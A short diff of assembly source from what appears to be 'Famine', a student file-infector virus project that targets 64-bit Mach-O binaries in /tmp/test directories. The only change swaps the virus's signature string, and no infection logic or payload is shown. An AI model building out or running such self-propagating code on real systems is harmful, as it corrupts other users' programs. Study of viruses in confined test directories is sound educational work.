@@ -244,7 +244,7 @@ insert_macho64:                                                 ; expecting data
                 ret
 
 slash_tmp       db          "/tmp/test/",0,"/tmp/test2/",0,0
-signature       db          "famine! darwin @42siliconvalley",0
+signature       db          "Famine version 1.0 (c)oded by asarandi",0
 
 pie_address     dq          (_start - _host)
 entry           dq          0
